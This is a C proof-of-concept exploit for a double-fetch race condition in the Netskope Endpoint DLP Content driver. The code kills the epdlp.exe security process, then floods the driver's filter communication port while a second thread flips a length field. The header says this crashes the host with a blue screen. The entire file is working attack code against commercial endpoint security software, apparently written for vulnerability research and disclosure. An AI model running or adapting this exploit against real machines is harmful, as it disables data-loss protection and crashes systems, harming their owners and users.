/*
WARNING: This PoC will cause a BSOD when executed on a host running the Netskope
		Endpoint DLP Content driver and service. Only run in a test environment, such as a VM.

Netskope Endpoint DLP Content Driver Double-Fetch
Tom Brice

NOTE: Needs to be run with Administrator privileges.

*/

#include <Windows.h>
#include <fltuser.h>
#include <stdio.h>
#include <TlHelp32.h>

#pragma comment(lib, "fltlib.lib")

struct adminEvent {
	DWORD command;					// 0x0
	DWORD commandLen;				// 0x4
	DWORD usbAction;				// 0x8
	DWORD deviceInstanceIdLen;		// 0xc
	BYTE deviceInstanceId[1];		// 0x10
};

HANDLE flipThread = nullptr;
volatile DWORD* flippingVal = nullptr;

DWORD flipFunc() {
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

	while (1) {
		*flippingVal ^= 0x1000;
	}

}

int sendCommPortMessage(adminEvent * ev) {
	INT status = 0;
	HANDLE hPort = nullptr;
	HRESULT res = 0;

	res = FilterConnectCommunicationPort(L"\\EpdlpPort", 0, nullptr, 0, nullptr, &hPort);
	if (res != S_OK || hPort == INVALID_HANDLE_VALUE) {
		printf("[!] Error calling FilterConnectCommunicationPort: 0x%X\n", res);
		return 1;
	}

	CHAR bufferOut[0x100] = { 0 };
	DWORD bufferOutLen = 0x100;
	DWORD bytesReturned = 0;

	while(1) {
		ResumeThread(flipThread);
		res = FilterSendMessage(hPort, ev, ev->commandLen, bufferOut, bufferOutLen, &bytesReturned);
		SuspendThread(flipThread);
	}

	if (hPort) CloseHandle(hPort);

	return status;
}

int terminateEpdlpProcess() {
	int status = 0;
	HANDLE hProcSnap = nullptr;
	HANDLE hEpdlp = nullptr;
	PROCESSENTRY32W pe32;
	int pid = 0;

	do {
		if ((hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) {
			printf("[!] Error creating process snapshot: 0x%X", GetLastError());
			status = 1;
			break;
		}

		pe32.dwSize = sizeof(PROCESSENTRY32W);

		if (!Process32FirstW(hProcSnap, &pe32)) {
			printf("[!] Error calling Process32FirstW: 0x%X\n", GetLastError());
			status = 1;
			break;
		}

		do {
			if ((lstrcmpiW(L"epdlp.exe", pe32.szExeFile)) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32NextW(hProcSnap, &pe32));

		hEpdlp = OpenProcess(PROCESS_TERMINATE, 0, pid);
		if (hEpdlp == INVALID_HANDLE_VALUE) {
			printf("[!] Error creating process snapshot: 0x%X", GetLastError());
			status = 1;
			break;
		}

		TerminateProcess(hEpdlp, 1);
		printf("[i] Terminated client process. Sleeping for 3 seconds...\n");
		Sleep(3000);

	} while (false);

	if (hProcSnap) CloseHandle(hProcSnap);
	if (hEpdlp) CloseHandle(hEpdlp);

	return status;
}

INT main() {
	printf("[i] Starting EPDLP double fetch poc...\n");

	adminEvent * ev = (adminEvent*) VirtualAlloc(nullptr, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (ev == nullptr) {
		printf("[!] Error allocating memory for adminEvent: 0x%X\n", GetLastError());
		return 1;
	}

	ev->command = 1;
	ev->commandLen = 4;
	ev->usbAction = 3;
	ev->deviceInstanceIdLen = 100;
	memset(ev->deviceInstanceId, 0x41, 0xfd0);

	flippingVal = &ev->deviceInstanceIdLen;

	flipThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)flipFunc, NULL, CREATE_SUSPENDED, NULL);
	if (!flipThread || flipThread == INVALID_HANDLE_VALUE) {
		printf("[!] Error creating flip thread: 0x%X\n", GetLastError());
		VirtualFree(ev, 0, MEM_RELEASE);
		return 1;
	}

	printf("[i] Terminating epdlp.exe...\n");
	if (terminateEpdlpProcess() != 0) {
		printf("[!] Error terminating epdlp.exe. Exiting PoC...\n");
		VirtualFree(ev, 0, MEM_RELEASE);
		CloseHandle(flipThread);
		return 1;
	}

	printf("[i] Starting race...\n");
	sendCommPortMessage(ev);

	CloseHandle(flipThread);
	VirtualFree(ev, 0, MEM_RELEASE);

	return 0;
}